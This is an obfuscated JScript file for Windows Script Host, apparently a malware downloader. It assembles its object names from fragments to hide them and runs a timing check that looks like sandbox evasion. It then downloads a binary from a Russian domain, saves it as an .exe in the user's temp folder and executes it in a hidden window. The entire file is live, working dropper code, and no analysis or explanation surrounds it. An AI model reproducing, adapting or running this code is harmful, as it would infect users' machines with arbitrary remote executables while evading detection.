var SH = false;
var LS = "Create"+"Object";
var H0 = function L() {return WScript[LS]("WScript"+".Shell");}(), J = 11;
var M = "MSXML2"+".XMLHTTP";
var NG = 2;
var LZ0 = NG - 2;
function H(QV){H0["Run"](QV, LZ0, LZ0);};
function R(){return M + "";};
function WW(C, UA){LZ0 = LZ0 * 1; return C - UA;};
function LZ(){return LS;};
/*@cc_on
  @if (@_win32 || @_win64)
    SH = true;
  @end
@*/
if (SH)
{
var O1 = "";
function O0(){return 22;};
var MR = 0; var BT = 0;
function B()
{
var KJ = new this["Date"]();
var Q = KJ["getUTCMilliseconds"]();
WScript["Sleep"](O0());
var KJ = new this["Date"]();
var DK = KJ["getUTCMilliseconds"]();
WScript["Sleep"](O0());
var KJ = new this["Date"]();
var E = KJ["getUTCMilliseconds"]();
var MR = "Z";
MR = WW(DK, Q);
var BT = "FS";
BT = WW(E, DK);
O1 = "open";
return WW(MR, BT);
}
var FJ = false;
var EF = false;
for (var K = LZ0; K < O0() * 1; K++){if (B() != LZ0){
FJ = true; 
BT = "31" + 11 * MR + BT; 
EF = true; 
break;
}}
function N() {return ((FJ == true) && (FJ == EF)) ? 1 : LZ0;};
if (FJ && N() && EF){
function O() {return H0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "e8uPkd5sjW64QJ.ex" + "e";};
 KF = R();
 B0 = WScript[LS](KF);
 var SF = 1;
do { 
	for (;SF;){
	try {
		if (SF == 1)
		{
			B0[O1]("GET", "http://zakaz-sharikov.ru/x9dslp", false);
			B0["send"]();
			OD = "Sleep";
			SF = 2;
		}
		WScript[OD](O0() + 120); 
		if (B0["readystate"] < 2 * 2) continue;
		SF = LZ0;
		function BP(GX) {var ET = (1, 2, 3, 4, 5, GX); return ET;};
		ZJ = WScript[LZ()]("ADODB.Stream");
		KF = ZJ;
		KF[O1]();
		KF["type"] = BP(1);
		KF["write"](B0["ResponseBody"]);
		ZJ["position"] = BP(LZ0);
		KF["Save" + "ToFile"](O(), 2);
		ZJ["cl"+"ose"]();
		N0 = O();
		H(N0);
	} catch(HC){};};
}while (SF);
}
}

